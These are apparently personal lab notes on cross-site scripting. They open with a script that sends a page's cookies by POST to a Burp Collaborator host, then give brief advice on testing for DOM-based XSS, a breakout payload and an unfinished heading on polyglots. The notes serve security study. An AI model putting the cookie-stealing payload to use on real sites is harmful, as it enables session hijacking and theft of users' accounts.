
# XSS

## Exploiting cross-site scripting to steal cookies

<script>
fetch('https:p9z114dhnywgf8ct7kwnwidujlpid7.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

p9z114dhnywgf8ct7kwnwidujlpid7.burpcollaborator.net

DOM xss

**How to test for Dom Based XSS:**

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "**window.location.x**" parameters.

When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as **eval()**
<script>
	document.getElementsByClassName('name')[0].innerHTML='Adam';
	</script>
	';alert('THM');//
	**Polyglots:**

  

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
